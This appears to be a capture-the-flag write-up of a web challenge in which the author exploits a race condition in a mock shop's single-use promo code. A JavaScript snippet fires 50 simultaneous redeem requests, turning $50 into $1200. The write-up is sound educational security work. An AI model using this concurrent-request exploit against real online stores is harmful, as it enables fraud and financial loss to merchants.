# Flash Sale Writeup
## About this Challenge
- *Challenge Author: Skillbit/MetaCTF*
- *Categories: Web Exploitation*
- *Date Released: June 25th, 2026*
- *Date Completed: June 25th, 2026*
- *Provided items: HTTPS Container*  
  
This problem was a part of Skillbit/MetaCTF's June Flash CTF. This particular challenge was completed by 110 individuals out of 793 in the competition and is categorized under the Web Exploitation group. The goal of this challenge was to buy a $200 item with only a $50 promo code.
## The Givens
For this challenge, we are given a container that holds the fake shopping website named FlashCart. On the initial landing page, we are given the opportunity to log in or create an account. After creating one using any credentials (in my case when creating new accounts I went down the keyboard with one letter usernames and passwords), we are shown a shopping page with some items along with a space to redeem a promo code. The challenge also gives the promo code FLASH50 that adds $50 to the current user's account. The end goal is to buy the Founders Edition Hoodie for $200 from the Flash Cart shop.
## Initial Attempts
One of my initial attempts include going into the classic inspect element and poking around in the page. I went into this with four different approaches, make the promo code give more money, allow myself to redeem the promo code multiple times, make the item I need to buy cheaper, or change one of the cheaper items into the item I need to buy. The important tab I needed to look at was the *Network* tab when inspecting the page, as it shows requests such as /redeem and /buy when I do the actions on the page. After redeeming the code we get the following POST response.

```javascript
await fetch("https://<challenge-host>.chals.sbhost.io/redeem", {
    "credentials": "include",
    "headers": {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    "body": "code=FLASH50",
    "method": "POST",
    "mode": "cors"
});
```
Sending this exact JavaScript to the website again gives a "You've already redeemed that gift card" message.

Looking at the things I can buy on the website with my newfound $50, I can easily buy a Canvas tote for $14. Looking at each of the buy now buttons in the website's HTML, I note that they have the following format.
```HTML
<form method="post" action="/buy">
    <input type="hidden" name="item" value="1">
	<button type="submit">Buy now</button>
</form>
```
I tried changing the value from the cheaper item from 1 to 4 to see if it would allow me to buy the more expensive item using the price of the cheaper item. of which I get the message *You need $200.00 for the Founders Edition Hoodie; you have $50.00.*
## Part 1: Noting the Endpoints
From my poking around during my initial attempts, I noticed that the redeeming and the buying of items is handled completely on the server side, looking and checking the values on the server instead of anything on the client, meaning attempting to change the price of items client side was not an option here.
## Part 2: The Promo Code
From earlier testing I know that attempting to redeem the code sequentially fails due to not allowing me to redeem a code multiple times, but that helped me map out how the code was probably being checked on the server side.
1. Check if the promo code exists
2. Check if this current account has redeemed it already
3. Talk to system whether or not the promo is still valid
4. Add the promo value to the user's wallet and note down that this user has redeemed it

There is a gap between checking if the account has redeemed it and adding the value to the user's wallet, also known as a time-of-check to time-of-use or TOCTOU gap. With this knowledge, what if instead of sending redeem requests sequentially, we send multiple all at once to redeem it at the same time, before the system notes down we have used it already.
## Part 3: Exploiting the Race Condition
I made a new account where I haven't redeemed the code yet and cooked up the following payload to attempt to redeem the code multiple times in the same instance.

```javascript
const url = "https://<challenge-host>.chals.sbhost.io/redeem";
const code = "FLASH50";

const requests = Array.from({ length: 50 }, () =>
    fetch(url, {
        credentials: "include",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        referrer: "https://dbf79d2abb2b9465.chals.sbhost.io/",
        body: `code=${code}`,
        method: "POST",
        mode: "cors"
    })
);

const results = await Promise.all(requests);
const bodies = await Promise.all(results.map(r => r.text()));
console.log(bodies);
```
The `Promite.all` sends all 50 requests essentially simultaneously without waiting for a response for each individual request. Giving us the most use of this gap to redeem as much of the promo code as we can.

After running this, the wallet amount went from zero to $1200 meaning that 24 of the 50 requests went through without being checked if they've been redeemed already. With more than enough money for the $200 dollar hoodie, I can just buy it, along with getting the flag.

`Order confirmed! Your Founders Edition Hoodie ships with code: SkillBit{redacted}`
## TL;DR
1. Found the format of /redeem and /buy though the browser's network tab
2. Confirmed the code FLASH50 was meant to be single use when used sequentially
3. Exploited a TOCTOU race condition by sending multiple /redeem requests through `Promise.all` in the browser console
4. Used the added funds to buy the hoodie and get the flag
## Tools Used
- Firefox DevTools, more specifically the network tab and the console tab
- JavaScript to send multiple promo requests at once
